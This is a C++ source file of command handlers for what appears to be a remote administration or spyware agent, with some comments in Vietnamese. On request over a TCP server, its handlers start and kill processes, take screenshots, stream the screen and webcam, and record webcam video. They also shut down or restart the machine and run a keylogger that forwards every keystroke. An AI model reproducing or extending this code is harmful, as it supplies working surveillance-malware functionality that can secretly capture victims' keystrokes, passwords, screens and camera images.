#include "ProcessHandlers.h"
#include "ProcessManager.h"
#include "AgentTcpServer.h"
#include "Capture.h"
#include "ScreenStream.h"
#include "Keylogging.h"
#include "WebcamRecord.h"
#include "WebcamStream.h"

// Helper: Trả về JSON status chuẩn
json ProcessHandlers::makeStatus(bool success, const std::string& msg, json extra) {
    json j = {{"type", "status"}, {"success", success}};
    if (!msg.empty()) j["message"] = msg;
    if (!extra.empty()) j.update(extra);
    return j;
}

// === PROCESS ===
json ProcessHandlers::listProcesses(const json&) {
    json arr = json::array();
    for (const auto& p : ProcessManager::listProcesses()) {
        arr.push_back({
            {"pid", p.pid}, {"name", p.name},
            {"workingSet", p.workingSet}, {"exePath", p.exePath}
        });
    }
    return {{"type", "process_list"}, {"data", arr}};
}

json ProcessHandlers::startProcess(const json& req) {
    std::string path = req.value("path", "");
    if (path.empty()) return makeStatus(false, "missing path");

    unsigned long pid = 0;
    bool ok = ProcessManager::startProcess(path, req.value("args", ""), &pid);
    return makeStatus(ok, "", {{"pid", pid}});
}

json ProcessHandlers::stopProcessPid(const json& req) {
    if (!req.contains("pid")) return makeStatus(false, "missing pid");
    return makeStatus(ProcessManager::stopProcessByPid(req["pid"]));
}

// === APPS ===
json ProcessHandlers::listApps(const json&) {
    json arr = json::array();
    for (const auto& a : ProcessManager::listUserApplications()) {
        arr.push_back({{"name", a.name}, {"process_count", a.processCount}});
    }
    return {{"type", "application_list"}, {"data", arr}};
}

json ProcessHandlers::startApp(const json& req) {
    std::string name = req.value("app_name", "");
    if (name.empty()) return makeStatus(false, "missing app_name");

    unsigned long pid = 0;
    bool ok = ProcessManager::startProcess(name, "", &pid);
    return makeStatus(ok, "", {{"pid", pid}});
}

json ProcessHandlers::stopApp(const json& req) {
    int count = ProcessManager::stopProcessesByName(req.value("app_name", ""));
    return makeStatus(count > 0, "", {{"stopped", count}});
}

// === SCREEN ===
json ProcessHandlers::captureScreen(const json&) {
    std::string b64 = capture_screenshot_base64();
    if (b64.empty()) return makeStatus(false, "capture failed");
    return {{"type", "screenshot"}, {"success", true}, {"data", b64}};
}

json ProcessHandlers::startScreenStream(const json& req) {
    ScreenStream::start(req.value("fps", 15));
    return makeStatus(true, "Screen streaming started");
}

json ProcessHandlers::stopScreenStream(const json&) {
    ScreenStream::stop();
    return makeStatus(true, "Screen streaming stopped");
}

// === KEYLOGGER ===
json ProcessHandlers::startKeylog(const json&) {
    // Đăng ký callback trực tiếp vào class Keylogging
    Keylogging::setCallback([](int key) {
        AgentTcpServer::instance().sendJson({
            {"type", "key_event"}, 
            {"key_code", key}
        });
    });
    
    Keylogging::start();
    return makeStatus(true, "Keylogger started");
}

json ProcessHandlers::stopKeylog(const json&) {
    Keylogging::stop();
    return makeStatus(true, "Keylogger stopped");
}

// === WEBCAM ===
json ProcessHandlers::startWebcamRecord(const json& req) {
    int time = req.value("time", 10);
    auto& server = AgentTcpServer::instance();

    server.sendJson({{"type", "webcam_recording_status"}, 
                     {"message", "Recording started (" + std::to_string(time) + "s)"}});

    std::string b64 = WebcamRecord::record_base64(time);
    
    if (b64.empty()) {
        server.sendJson({{"type", "webcam_recording_status"}, {"message", "Recording failed"}});
        return makeStatus(false, "record failed");
    }

    server.sendJson({{"type", "webcam_video"}, {"success", true}, {"data", b64}});
    return makeStatus(true, "Webcam video sent");
}

json ProcessHandlers::stopWebcamRecord(const json&) {
    AgentTcpServer::instance().sendJson({
        {"type", "webcam_recording_status"}, 
        {"message", "Recording cancelled"}
    });
    return makeStatus(true, "Stop signal sent");
}

json ProcessHandlers::startWebcamStream(const json& req) {
    WebcamStream::start(req.value("fps", 30));
    AgentTcpServer::instance().sendJson({
        {"type", "webcam_recording_status"}, {"message", "Webcam streaming started"}
    });
    return makeStatus(true, "Webcam streaming started");
}

json ProcessHandlers::stopWebcamStream(const json&) {
    WebcamStream::stop();
    AgentTcpServer::instance().sendJson({
        {"type", "webcam_recording_status"}, {"message", "Webcam streaming stopped"}
    });
    return makeStatus(true, "Webcam streaming stopped");
}

// === SYSTEM ===
json ProcessHandlers::systemShutdown(const json&) {
    std::system("shutdown /s /t 0");
    return makeStatus(true, "Shutdown command sent");
}

json ProcessHandlers::systemRestart(const json&) {
    std::system("shutdown /r /t 0");
    return makeStatus(true, "Restart command sent");
}